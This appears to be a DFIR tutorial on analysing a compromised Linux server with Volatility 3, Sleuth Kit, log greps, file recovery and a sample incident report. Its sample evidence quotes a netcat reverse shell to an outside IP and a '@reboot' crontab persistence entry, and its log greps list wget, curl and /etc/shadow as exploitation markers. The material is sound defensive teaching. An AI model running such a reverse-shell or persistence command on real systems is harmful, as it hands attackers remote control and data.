---
title: "Linux Memory and Log Forensics — Volatile Data Analysis, Timeline Reconstruction, and Artefact Recovery — Part 2"
date: 2026-09-01
description: "Analyse acquired forensic evidence: extract artefacts from Linux memory dumps with Volatility, reconstruct an attack timeline from file system timestamps and logs, recover deleted files, and identify attacker persistence mechanisms."
cluster: "Network Security"
series: "Forensics"
part: 2
difficulty: "advanced"
duration: "55 min"
tags: ["forensics", "incident-response", "memory-forensics", "volatility", "log-analysis", "timeline", "network-security", "devsecops"]
categories: ["tutorial"]
draft: false
toc: true
---

## What you will build

In [Part 1](/tutorials/network-security/digital-forensics-evidence-acquisition-disk-imaging-part-1/) you acquired forensic evidence — disk image, RAM dump, and volatile system state. In Part 2 you will analyse it: extract artefacts from the memory dump using Volatility, reconstruct the attack timeline using file system timestamps and log correlation, recover deleted files, and document attacker persistence mechanisms found.

## Prerequisites

- Completed [Part 1](/tutorials/network-security/digital-forensics-evidence-acquisition-disk-imaging-part-1/)
- A Linux analysis workstation (REMnux recommended)
- Python 3.8+, git
- The forensic image and memory dump from Part 1

---

## Step 1 — Linux memory forensics with Volatility 3

Volatility is the standard tool for memory forensics. Volatility 3 does not require a separate profile — it derives kernel structure offsets directly from the memory dump.

```bash
# Install Volatility 3
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt

# Basic usage
python3 vol.py -f /evidence/memory.lime <plugin>

# Run info to confirm the memory dump is recognised
python3 vol.py -f /evidence/memory.lime banners.Banners
# Linux version 5.15.0-91-generic (Ubuntu SMP)
```

### Process analysis

```bash
# List all processes from kernel process list
python3 vol.py -f /evidence/memory.lime linux.pslist.PsList
# PID    PPID   COMM         CREATED
# 1      0      systemd      2026-09-01 08:00:01
# ...
# 3847   1      sshd         2026-09-01 10:15:22
# 3901   3847   bash         2026-09-01 10:15:23
# 3944   3901   nc           2026-09-01 10:16:44   ← suspicious
# 3945   3944   bash         2026-09-01 10:16:44   ← shell spawned by netcat

# Show process tree
python3 vol.py -f /evidence/memory.lime linux.pstree.PsTree

# List processes with command line arguments (reveals attacker commands)
python3 vol.py -f /evidence/memory.lime linux.cmdline.CmdLine
# PID 3944: nc -e /bin/bash 185.220.101.5 4444

# Show open files per process
python3 vol.py -f /evidence/memory.lime linux.lsof.Lsof --pid 3944

# Show network connections
python3 vol.py -f /evidence/memory.lime linux.sockstat.Sockstat
# PID  COMM    LOCAL              REMOTE             STATE
# 3944 nc      10.0.1.10:49832    185.220.101.5:4444 ESTABLISHED
```

### Detect hidden processes (rootkit indicator)

```bash
# Compare pslist (from kernel linked list) vs psscan (from memory structures)
# Hidden processes appear in psscan but not pslist

python3 vol.py -f /evidence/memory.lime linux.pslist.PsList > pslist.txt
python3 vol.py -f /evidence/memory.lime linux.psscan.PsScan > psscan.txt

# Find PIDs in psscan not in pslist (DKOM rootkit indicator)
comm -23 \
  <(awk '{print $1}' psscan.txt | sort) \
  <(awk '{print $1}' pslist.txt | sort) \
  | grep -v "^[A-Z]"

# If any PIDs appear here, a rootkit is hiding them from the process list
```

### Extract files from memory

```bash
# List files that were open/mapped in memory
python3 vol.py -f /evidence/memory.lime linux.enumerate_files.EnumerateFiles \
  | grep -v "^0x" | head -50

# Dump a specific file from memory (e.g., recover a malware binary)
python3 vol.py -f /evidence/memory.lime linux.find_file.FindFile \
  --find "/tmp/.hidden_binary"

python3 vol.py -f /evidence/memory.lime linux.dump_map.DumpMap \
  --pid 3944 --virtaddr 0x7f8a3b400000 \
  -o /evidence/dumped-binary/

# Verify the dumped file
file /evidence/dumped-binary/*
sha256sum /evidence/dumped-binary/*
```

---

## Step 2 — Log analysis

Log files are the primary source of attacker activity evidence on a running system. Work from the forensic image — do not analyse a live system.

### Access the logs from the mounted image

```bash
# Mount the forensic image (read-only, as established in Part 1)
# Logs are in /mnt/evidence/var/log/

LOG_DIR="/mnt/evidence/var/log"
```

### Authentication log analysis

```bash
# Failed SSH authentication attempts
grep "Failed password" ${LOG_DIR}/auth.log \
  | awk '{print $11}' | sort | uniq -c | sort -rn | head -20
# Count  Source IP
# 4823   185.220.101.5     ← brute-force source
# 127    203.0.113.10

# Successful logins (correlation point: when did attacker gain access?)
grep "Accepted password\|Accepted publickey" ${LOG_DIR}/auth.log
# Sep  1 10:15:22 srv-prod-01 sshd[3847]: Accepted password for root from 185.220.101.5

# Privilege escalation (sudo)
grep "sudo\|su:" ${LOG_DIR}/auth.log | grep -v "pam_unix"

# New user accounts created
grep "useradd\|groupadd\|usermod" ${LOG_DIR}/auth.log
grep "new user:\|new group:" ${LOG_DIR}/auth.log
```

### Syslog and kernel log analysis

```bash
# Kernel module loads (potential rootkit installation)
grep "insmod\|modprobe\|module" ${LOG_DIR}/syslog | grep -v "^$"

# Cron job execution (identify malicious cron persistence)
grep "CRON" ${LOG_DIR}/syslog | grep -v "CMD (/usr/sbin"

# OOM killer (may indicate a process was killed — attacker tool)
grep "oom_kill\|Out of memory" ${LOG_DIR}/kern.log

# Firewall drops (what was blocked before/during attack)
grep "UFW BLOCK\|iptables\|NFTABLES" ${LOG_DIR}/kern.log | head -30
```

### Web server log analysis (Apache/nginx)

```bash
# Identify scanning and exploitation attempts
grep -E "(union|select|insert|drop|script|passwd|etc/shadow|\.\.\/)" \
  ${LOG_DIR}/nginx/access.log | head -30

# High request rate from single IP (scanning)
awk '{print $1}' ${LOG_DIR}/nginx/access.log \
  | sort | uniq -c | sort -rn | head -10

# 4xx errors (reconnaissance — probing for files/paths)
grep " 404 " ${LOG_DIR}/nginx/access.log \
  | awk '{print $7}' | sort | uniq -c | sort -rn | head -20

# Successful requests that look like exploitation
grep " 200 " ${LOG_DIR}/nginx/access.log \
  | grep -iE "(cmd=|exec=|eval|base64|wget|curl|bash|sh)"
```

---

## Step 3 — Timeline reconstruction

A forensic timeline correlates file system timestamps, log events, and process activity into a single chronological view of events. This is the core deliverable of most incident investigations.

### MAC timestamps

Every file on an ext4 filesystem has four timestamps:
- **mtime** — last modification time (content changed)
- **atime** — last access time (file read)
- **ctime** — inode change time (permissions, ownership, links changed)
- **crtime** — creation time (birth time, not always available)

```bash
# Check timestamps of suspicious files
stat /mnt/evidence/tmp/.hidden_binary
# File: /mnt/evidence/tmp/.hidden_binary
# Modify: 2026-09-01 10:17:03.421
# Access: 2026-09-01 10:17:45.211
# Change: 2026-09-01 10:17:03.421

# Find all files modified in a suspicious window (e.g., during the incident)
find /mnt/evidence -newermt "2026-09-01 10:00" -not -newermt "2026-09-01 12:00" \
  -type f -ls 2>/dev/null | sort -k11 > /evidence/modified-files.txt
```

### Build a timeline with fls and mactime (Sleuth Kit)

```bash
apt-get install -y sleuthkit

# Generate a file system timeline body file from the disk image
fls -r -m / /evidence/srv-prod-01-disk.dd \
  | tee /evidence/bodyfile.txt

# Generate a sorted timeline from the body file
mactime -b /evidence/bodyfile.txt "2026-09-01" "2026-09-02" \
  | tee /evidence/timeline.txt

# View the timeline around the incident window
grep "10:1[0-9]" /evidence/timeline.txt | head -50
```

### Correlate with log events

```bash
# Create a unified timeline combining file system + log events
cat > /evidence/unified-timeline.sh << 'EOF'
#!/bin/bash

# Extract log events with timestamps
grep -h "" /mnt/evidence/var/log/auth.log \
  /mnt/evidence/var/log/syslog \
  /mnt/evidence/var/log/kern.log 2>/dev/null \
  | grep "Sep  1 10" \
  | awk '{print "2026-09-01 " $3 " LOG: " $0}' \
  > /evidence/log-events.txt

# Merge file system timeline and log events, sorted by time
sort -t' ' -k1,2 /evidence/log-events.txt /evidence/timeline.txt \
  > /evidence/merged-timeline.txt
EOF

bash /evidence/unified-timeline.sh

# Sample output:
# 2026-09-01 10:15:22 LOG: sshd[3847]: Accepted password for root from 185.220.101.5
# 2026-09-01 10:15:23 m.. /root/.bash_history (modified — attacker cleared history)
# 2026-09-01 10:16:44 m.. /tmp/.hidden_binary (created — malware dropped)
# 2026-09-01 10:17:03 m.. /etc/crontab (modified — persistence added)
```

---

## Step 4 — Recover deleted files

Attackers often delete malware and logs after the attack. Deleted files on ext4 remain recoverable until their blocks are overwritten.

### Using extundelete

```bash
apt-get install -y extundelete

# List recently deleted files from the forensic image
extundelete /evidence/srv-prod-01-disk.dd \
  --inode 2    # root inode

# Recover all deleted files from a specific directory
extundelete /evidence/srv-prod-01-disk.dd \
  --restore-directory /tmp \
  --output-dir /evidence/recovered/

# Recover a specific deleted file by inode
extundelete /evidence/srv-prod-01-disk.dd \
  --restore-inode 1234567 \
  --output-dir /evidence/recovered/
```

### Using Autopsy / The Sleuth Kit

```bash
# Create a case in Autopsy (GUI — recommended for comprehensive analysis)
autopsy

# Or use icat directly to recover a file by inode from CLI
icat /evidence/srv-prod-01-disk.dd 1234567 > /evidence/recovered/deleted-file

# Find all deleted inodes in the file system
ils /evidence/srv-prod-01-disk.dd | head -30
```

### Carving files from unallocated space

File carving recovers files based on magic bytes (file headers/footers) without relying on file system metadata — works even if the file system is severely damaged:

```bash
apt-get install -y foremost scalpel

# Carve files from the entire disk image by file signature
foremost -T -i /evidence/srv-prod-01-disk.dd \
  -t exe,pdf,jpg,zip,elf \
  -o /evidence/carved/

# Results in /evidence/carved/: directories per file type with recovered files
ls /evidence/carved/exe/
sha256sum /evidence/carved/exe/* | tee /evidence/carved-hashes.txt
```

---

## Step 5 — Identify attacker persistence

Check all common persistence locations in the forensic image:

```bash
EVIDENCE="/mnt/evidence"

echo "=== Persistence Artefact Analysis ==="

# Cron jobs
echo "--- Cron entries ---"
cat ${EVIDENCE}/etc/crontab 2>/dev/null
ls -la ${EVIDENCE}/etc/cron.* 2>/dev/null
for f in ${EVIDENCE}/var/spool/cron/crontabs/*; do
    echo "--- $f ---"
    cat "$f"
done

# Systemd service units (attacker-installed services)
echo "--- Systemd services ---"
find ${EVIDENCE}/etc/systemd/system/ \
     ${EVIDENCE}/lib/systemd/system/ \
     -name "*.service" -newer ${EVIDENCE}/etc/passwd \
  | while read svc; do
      echo "Modified service: $svc"
      cat "$svc"
  done

# SSH authorized_keys (backdoor SSH key)
echo "--- Authorized SSH keys ---"
find ${EVIDENCE}/home ${EVIDENCE}/root -name "authorized_keys" -exec cat {} \;

# Startup scripts
echo "--- Init scripts ---"
ls -lat ${EVIDENCE}/etc/init.d/ | head -10
ls -lat ${EVIDENCE}/etc/profile.d/ | head -10

# Kernel modules (rootkit)
echo "--- Kernel modules ---"
diff <(sort ${EVIDENCE}/lib/modules/$(uname -r)/modules.dep 2>/dev/null) \
     <(lsmod | awk '{print $1}' | sort) 2>/dev/null

# SUID binaries (potential privilege escalation)
echo "--- SUID binaries ---"
find ${EVIDENCE} -perm -4000 -type f 2>/dev/null \
  | while read f; do
      stat --printf="%n modified: %y\n" "$f"
  done
```

---

## Step 6 — Compile the incident report

Structure the forensic findings into an actionable report:

```markdown
# Incident Forensics Report
## Case: INC-2026-001
## Date: 2026-09-01
## Examiner: J. Smith

---

## Executive Summary
At 10:15 UTC on 2026-09-01, an attacker gained initial access to srv-prod-01
via SSH brute-force from 185.220.101.5. A reverse shell was established and
a persistence mechanism was installed in crontab. Evidence of data exfiltration
to 185.220.101.5:4444 was observed in network logs.

## Timeline of Attack
| Time (UTC)  | Event |
|-------------|-------|
| 08:00–10:15 | SSH brute-force from 185.220.101.5 (4,823 failed attempts) |
| 10:15:22    | Successful SSH login as root from 185.220.101.5 |
| 10:16:44    | Reverse shell established: nc -e /bin/bash 185.220.101.5 4444 |
| 10:17:03    | Malware dropped to /tmp/.hidden_binary |
| 10:17:05    | Crontab modified: @reboot /tmp/.hidden_binary |
| 10:18:00    | /etc/shadow and /etc/passwd copied to /tmp/ |
| 10:22:15    | /tmp/ contents uploaded to 185.220.101.5 (estimated by flow data) |
| 10:25:00    | /tmp files deleted (recovered via extundelete) |

## Indicators of Compromise
### Network
- Attacker IP: 185.220.101.5
- C2 connection: TCP 185.220.101.5:4444
- Beacon interval: 30s

### Host
- Malware: /tmp/.hidden_binary (SHA-256: abc123...)
- Persistence: crontab entry `@reboot /tmp/.hidden_binary`
- Exfiltrated: /etc/shadow, /etc/passwd

## Evidence Collected
- Disk image: srv-prod-01-disk.dd (SHA-256: a3f4b2c1...)
- Memory dump: memory.lime (SHA-256: d5e6f7a8...)
- Log files: auth.log, syslog, kern.log, nginx/access.log

## Recommendations
1. Rotate all credentials on srv-prod-01 and all systems it could reach
2. Block 185.220.101.5 at perimeter firewall
3. Implement SSH key-only authentication (disable password auth)
4. Deploy fail2ban to automatically block SSH brute-force sources
5. Review and audit all crontabs and systemd services across the fleet
```

---

## Step 7 — Forensic tools quick reference

| Tool | Purpose | Install |
|---|---|---|
| Volatility 3 | Memory forensics | `pip3 install volatility3` |
| Sleuth Kit + Autopsy | Disk forensics GUI | `apt-get install sleuthkit autopsy` |
| dc3dd | Forensic disk imaging | `apt-get install dc3dd` |
| ewftools | EWF image acquisition/verification | `apt-get install ewf-tools` |
| extundelete | ext4 file recovery | `apt-get install extundelete` |
| foremost | File carving | `apt-get install foremost` |
| LiME | Linux memory acquisition | Build from source |
| log2timeline / plaso | Multi-source timeline | `pip3 install plaso` |
| YARA | Pattern-based malware detection | `apt-get install yara` |
| REMnux | Complete analysis Linux distro | Download VM image |

---

## What you have built

- Volatility 3 memory analysis — process listing, hidden process detection (DKOM), command line extraction, network socket enumeration, file extraction from memory
- Log analysis workflow — auth.log brute-force and successful login correlation, web log exploitation detection, kernel log rootkit indicators
- Timeline reconstruction — MAC timestamps, Sleuth Kit fls/mactime, unified log + filesystem timeline
- Deleted file recovery with extundelete (inode-based) and foremost (file carving on unallocated space)
- Persistence artefact identification — cron, systemd services, authorized_keys, SUID binaries
- Structured incident report template connecting the timeline, IOCs, evidence, and remediation steps
